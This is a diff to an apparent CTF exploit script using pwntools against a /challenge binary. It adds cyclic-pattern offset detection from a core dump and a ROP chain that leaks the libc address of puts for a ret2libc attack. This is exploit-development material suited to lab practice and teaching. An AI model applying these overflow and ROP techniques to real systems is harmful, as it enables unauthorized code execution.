@@ -1,3 +1,4 @@
+import shutil
 import pwn
 
 pwn.context.update(arch="amd64", os="linux", terminal=["tmux", "new-window"])
@@ -36,12 +37,24 @@ def find_challenge(search_path="/challenge"):
     return xs[0]
 
 
-bin = find_challenge()
-elf = pwn.ELF(bin)
+def find_offset():
+    bin = find_challenge()
+    tmp = f"/tmp/{bin.lstrip('/challenge/')}"
+    shutil.copy2(bin, tmp)
+    io = pwn.process(tmp, level="error")
+    io.sendline(pwn.cyclic(256))
+    io.wait()
+    core = io.corefile
+    fault_val = core.read(core.rsp, 4)
+    offset = pwn.cyclic_find(fault_val)
+    return offset
 
-io = pwn.process(bin)
-tee(io)
-padding = 0x88
+
+bin = find_challenge()
+elf = pwn.ELF(bin, checksec=False)
+
+io = tee(pwn.process(bin))
+padding = find_offset()
 
 rop = pwn.ROP(elf)
 rop.raw(rop.generatePadding(0, padding))
@@ -50,7 +63,7 @@ rop.call(elf.symbols["challenge"])
 
 io.sendline(rop.chain())
 io.recvuntil(b"Leaving!\n")
-leak_puts_addr = pwn.u64(io.recvuntil(b"\n", drop=True).ljust(8, b"\0"))
+leak_puts_addr = pwn.u64(io.recv(6).ljust(8, b"\0"))
 
 libc = elf.libc
 assert libc
